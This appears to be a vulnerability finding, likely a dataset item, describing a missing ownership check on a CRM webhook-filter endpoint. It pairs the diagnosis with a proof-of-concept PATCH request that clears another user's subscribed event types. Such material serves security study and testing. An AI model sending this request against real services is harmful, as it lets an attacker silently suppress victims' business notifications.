diagnosis: The endpoint retrieves WebhookFilterConfig solely by filter_id without checking that the associated webhook is owned by request.user or their team. An attacker can tamper with event filter topics on victim webhooks, suppressing vital business event notifications or causing denial of service by clearing the subscribed event types list.
exploit_request:
PATCH /api/webhooks/filters/409/ HTTP/1.1
Host: notify.crm-service.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"event_types": []}
